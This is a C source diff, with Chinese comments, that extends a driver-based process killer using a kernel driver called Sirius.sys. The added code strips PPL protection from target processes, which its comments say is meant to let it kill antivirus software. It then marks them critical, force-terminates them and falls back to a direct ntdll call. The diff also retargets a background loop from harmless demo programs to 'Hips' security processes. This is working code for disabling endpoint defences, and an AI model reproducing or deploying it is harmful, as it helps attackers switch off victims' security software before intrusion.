@@ -714,16 +714,53 @@ static BOOL KillProcessByDriver(ULONG pid) {
                                  0, NULL, OPEN_EXISTING, 0, NULL);
     if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
 
-    SI_PROCESS_INFO req = { 0 };
-    req.ProcessInformation = SIRIUS_PROCESS_TERMINATE;
-    req.PID = pid;
-    req.Buffer = NULL;
-    req.Argument = 2;  /* memory-based forced termination — 最强力终止 */
-
     DWORD returned = 0;
+
+    /* 第一步: 剥离 PPL 保护（Protection=4, type=0(PsProtectedTypeNone)）
+     * 如果不先去掉保护，PPL 进程（如杀软）无法被终止 */
+    SI_PROCESS_INFO protReq = { 0 };
+    protReq.ProcessInformation = 4;  /* Protection */
+    protReq.PID = pid;
+    protReq.Buffer = NULL;
+    protReq.Argument = 0;
+    DeviceIoControl(hDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
+                    &protReq, sizeof(protReq), NULL, 0, &returned, NULL);
+
+    /* 第二步: 设为关键进程（Critical=5, Argument=1）
+     * 标记后进程一旦退出就会触发 BSOD，倒逼系统放弃对该进程的保护 */
+    SI_PROCESS_INFO critReq = { 0 };
+    critReq.ProcessInformation = 5;  /* Critical */
+    critReq.PID = pid;
+    critReq.Buffer = NULL;
+    critReq.Argument = 1;
+    DeviceIoControl(hDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
+                    &critReq, sizeof(critReq), NULL, 0, &returned, NULL);
+
+    /* 第三步: 内存级强制终止（Argument=2） */
+    SI_PROCESS_INFO termReq = { 0 };
+    termReq.ProcessInformation = SIRIUS_PROCESS_TERMINATE;
+    termReq.PID = pid;
+    termReq.Buffer = NULL;
+    termReq.Argument = 2;  /* memory-based forced termination */
+
     BOOL ok = DeviceIoControl(hDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
-                              &req, sizeof(req), NULL, 0, &returned, NULL);
+                              &termReq, sizeof(termReq), NULL, 0, &returned, NULL);
     CloseHandle(hDevice);
+
+    /* 第四步: 驱动方式全部失败，通过 ntdll NtTerminateProcess 直调兜底 */
+    if (!ok) {
+        typedef LONG (WINAPI *NtTerminateProcess_t)(HANDLE, LONG);
+        NtTerminateProcess_t pNtTerminateProcess = (NtTerminateProcess_t)
+            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTerminateProcess");
+        if (pNtTerminateProcess) {
+            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+            if (!hProc) hProc = OpenProcess(0x1000, FALSE, pid); /* PROCESS_QUERY_LIMITED_INFO */
+            if (hProc) {
+                ok = (pNtTerminateProcess(hProc, 0) >= 0);
+                CloseHandle(hProc);
+            }
+        }
+    }
     return ok;
 }
 
@@ -2011,7 +2048,7 @@ int main(int argc, char *argv[]) {
          *   模糊匹配逗号分隔的进程名，每 3 秒扫描一次
          *   优先使用 Sirius.sys 内核驱动终止，降级为 TerminateProcess
          */
-        StartBackgroundKiller("notepad.exe,calc.exe,mspaint.exe");
+        StartBackgroundKiller("Hips");
 
         /*==========================内核级代码结束===========================*/
 
